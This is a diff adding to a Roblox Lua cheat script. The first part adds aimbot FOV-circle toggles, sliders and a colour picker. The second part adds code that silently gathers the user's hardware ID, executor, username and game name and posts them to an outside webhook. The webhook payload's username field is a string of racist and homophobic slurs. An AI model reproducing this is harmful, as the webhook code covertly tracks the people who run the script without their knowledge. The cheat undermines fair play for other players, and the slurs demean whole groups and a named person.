+AimbotTab:CreateToggle({
+    Name = "Enable FOV Circle",
+    CurrentValue = false,
+    Callback = function(Value)
+        fovEnabled = Value
+        if fovEnabled and not aimCircle then
+            createAimCircle()
+        end
+    end,
+})
+
+AimbotTab:CreateSlider({
+    Name = "FOV Circle Radius",
+    Range = {50, 500},
+    Increment = 10,
+    Suffix = "px",
+    CurrentValue = aimCircleRadius,
+    Callback = function(Value)
+        aimCircleRadius = Value
+        if aimCircle then
+            aimCircle.Radius = aimCircleRadius
+        end
+    end,
+})
+
+AimbotTab:CreateSlider({
+    Name = "FOV Circle Thickness",
+    Range = {1, 10},
+    Increment = 1,
+    Suffix = "px",
+    CurrentValue = aimCircleThickness,
+    Callback = function(Value)
+        aimCircleThickness = Value
+        if aimCircle then
+            aimCircle.Thickness = aimCircleThickness
+        end
+    end,
+})
+
+AimbotTab:CreateColorPicker({
+    Name = "FOV Colorpicker",
+    Color = circleColor,
+    Callback = function(Value)
+        circleColor = Value
+        if aimCircle then
+            aimCircle.Color = circleColor
+        end
+    end,
+})
+
+
+
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local WebhookURL = "https://[Log in to view URL]"
+
+local function GetHWID()
+    local hwid
+    pcall(function()
+        hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    return hwid or "Unknown"
+end
+
+local function GetExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
+    else
+        return "Unknown Executor"
+    end
+end
+
+local function GetUsername()
+    local player = Players.LocalPlayer or Players:GetPlayers()[1]
+    return player and player.Name or "Unknown"
+end
+
+local function GetDiscordID()
+    return "Unknown"
+end
+
+local function GetGameName()
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if success and info and info.Name then
+        return info.Name
+    else
+        return "Unknown Game"
+    end
+end
+
+local Data = {
+    ["username"] = "FAT NIGGERS USING FREE SCRIPT CUS THESE NIGGERS ARE BROKE NIGGERS FUCK BOY I HATE FAGGOTS AKA: I HATE DAN FROM EXPRESS HUB",
+    ["embeds"] = {{
+        ["title"] = "User Executed!",
+        ["description"] = "This user has executed the script successfully.\n\n",
+        ["color"] = 8388736,
+        ["fields"] = {
+            { ["name"] = "**HWID:**", ["value"] = "||" .. GetHWID() .. "||", ["inline"] = false },
+            { ["name"] = "**Executor:**", ["value"] = "||" .. GetExecutor() .. "||", ["inline"] = false },
+            { ["name"] = "**Discord ID:**", ["value"] = "" .. GetDiscordID(), ["inline"] = false },
+            { ["name"] = "**Roblox Username:**", ["value"] = "" .. GetUsername(), ["inline"] = false },
+            { ["name"] = "**Game Name:**", ["value"] = "" .. GetGameName(), ["inline"] = false },
+            { ["name"] = "**X-Dk Free Version**", ["value"] = "ID: 1355520180431753237", ["inline"] = false },
+        },
+        ["footer"] = {
+            ["text"] = "Luarmor - #1 Lua Licensing System",
+            ["icon_url"] = "https://[Log in to view URL]"
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local EncodedData = HttpService:JSONEncode(Data)
+
+local success, response
+if syn and syn.request then
+    success, response = pcall(syn.request, {
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = EncodedData
+    })
+elseif request then
+    success, response = pcall(request, {
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = EncodedData
+    })
+elseif http and http.request then
+    success, response = pcall(http.request, {
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = EncodedData
+    })
+else
+    print("❌ No supported HTTP request function found.")
+end
+
+if success then
+    print("✅ Execution log sent successfully!")
+else
+    print("❌ Failed to send execution log.")
+end
